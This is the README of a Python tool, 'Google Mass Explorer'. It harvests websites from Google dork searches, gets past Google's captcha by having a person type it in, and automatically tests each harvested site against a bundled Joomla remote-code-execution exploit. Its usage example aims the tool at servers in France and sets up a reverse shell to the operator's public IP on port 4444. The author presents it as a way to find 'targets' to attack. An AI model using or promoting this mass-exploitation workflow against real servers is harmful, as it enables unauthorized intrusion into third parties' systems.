[+] Google Mass Explorer
This is a automated robot for google search engine.

Make a google search, and parse the results for a especific exploit you define.
The options can be listed with --help parameter.

Intro:
This project is a main project that i will keep upgrading when new exploits are published. They idea is use google search engine to find vulnerable targets, for specific exploits. The exploits parsers will be concentrated in google_parsers module. So when you make a search, you can choose explicit in "--exploit parser" argument, a especific exploit to the robot test if is the targets are vulnerable for that or not.
*** Is very important you use the right dork for the specific exploit.

The google parsers module (google_parsers.py) is the file that i will keep upgrading. For this version i'm putting just the joomla cve exploit. I have a wordpress bot too, but the ideia is you make your own parsers =))) If you have difficul to make, just send me the exploit and we make together =))

I make this google explorer because i'm very busy, and take to much time to search for targets in google manually. So I use a automated framework (Selenium) to make a robot to search for targets for me ;)) The problem using other libs and modules, is the captcha from google, and using Selenium, you can type the captcha when it is displayed, and the robots keeps crawling with no problem =)) This was the only way i find out to "bypass" this kind of protection... After it work, i decide to publish to everyone.

Basictly, how the robot works:
1 - Make a google search
2 - Parse the from each page results
3 - Test if each target is vulnerable for a specific exploit.

Requiriments:
-----> !!!!!! PYTHON 3  !!!!!! <------ THIS PROJECT IS ONLY FOR PYTHON 3 !!!!!!! 
The requirements is in requirements.txt file, you should install what is listed on it with: 
$ sudo pip install -R requirements.txt

These are some exemples that you can use, and make your own:

python3 google_explorer.py --dork="site:*.com inurl:index.php?option=" --browser="chrome" --exploit_parser="joomla_15_12_2015_rce" --revshell="MY_PUBLIC_IP" --port=4444 --google_domain="google.com" --location="França" --last_update="no último mês"

On this exemple, im looking for servers in France, vulnerables to joomla RCE, using google.com domain as google search (they are listed in google_doomais.txt file), with last update on last month.

All these options are possible to any language, it will depends only in what google use for syntax for your country..

I have some old videos on my channel on youtube showing how it works, so take a look at the description of the olders projects in github if you need some video exemples ;))


These are the current options for this project:

Usage:

    google_explorer.py --dork=<arg> --browser=<arg> [--exploit_parser=<arg>] [--language=<arg>]
                                                    [--location=<arg>]       [--last_update=<arg>]
                                                    [--revshell=<arg>]       [--port=<arg>]
                                                    [--google_domain=<arg>]

    google_explorer.py --help
    google_explorer.py --version

Options:

    -h --help                                Open help menu
    -v --version                             Show version

Required options:

    --dork='google dork'                     your favorite g00gle dork :)
    --browser='browser'                      chrome
                                             chromium


Optional options:

    --language='page language'               Portuguese
                                             English
                                             Arabic
                                             Romanian
                                             ...
                                             ...
    
    --location='server location'             Brazil
                                             Mauritania
                                             Tunisia
                                             Marroco
                                             Japan
                                             ...
                                             ...
    
    --last_update='page last update'         anytime
                                             past 24 hours
                                             past week
                                             past month
                                             past year

    --exploit_parser='Name or CVE exploit'   joomla_15_12_2015_rce
                                             generic_parser

    --revshell='IP'                          public ip for reverse shell
    --port='PORT'                            port for back connect

    --google_domain='google domain'          google domain to use on search. Ex: google.co.uk







